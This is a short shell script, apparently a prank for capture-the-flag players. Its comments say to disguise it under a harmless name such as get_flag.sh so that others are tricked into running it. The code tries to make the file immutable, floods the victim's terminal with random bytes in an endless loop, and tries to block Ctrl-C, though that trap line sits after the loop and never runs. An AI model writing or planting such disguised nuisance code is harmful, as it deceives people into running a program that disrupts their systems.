# Floods screen with garbage. Save the script as something innocuous, such as get_flag.sh 
# to trick other players into executing it. 

sudo chattr +i $(basename $0) 2>/dev/null  # try to make file immutable
while true; do cat /dev/urandom; done      # flood victim screen with junk
trap "" SIGINT                             # disable Ctrl-C
